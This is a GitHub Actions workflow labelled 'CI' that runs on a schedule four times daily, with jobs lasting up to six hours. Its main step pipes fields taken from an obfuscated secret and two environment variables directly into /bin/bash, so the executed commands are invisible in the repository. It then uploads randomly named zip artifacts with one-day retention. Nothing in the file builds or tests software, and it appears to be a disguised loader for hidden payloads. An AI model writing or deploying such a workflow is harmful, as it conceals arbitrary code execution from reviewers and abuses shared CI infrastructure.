name: CI
on:
  workflow_dispatch:

  schedule:
    - cron: '38 1,7,13,19 * * *'
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  launch:
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - name: Checkout
        uses: actions/checkout@v4
        with:
          fetch-depth: 1
      - name: Do work
        env:
          x28: ${{ secrets.x28 }}
        run: |
          printf '%s' "$x28" | jq -r .bc1487 | /bin/bash
          printf '%s' "$yubrb7860" | jq -r .jxw3 | /bin/bash
          echo $uh25 | jq -r .yels60 | /bin/bash

      - name: Archive data
        uses: actions/upload-artifact@v4
        with:
          name: Ra1HcelP
          path: "*.zip"
          retention-days: 1
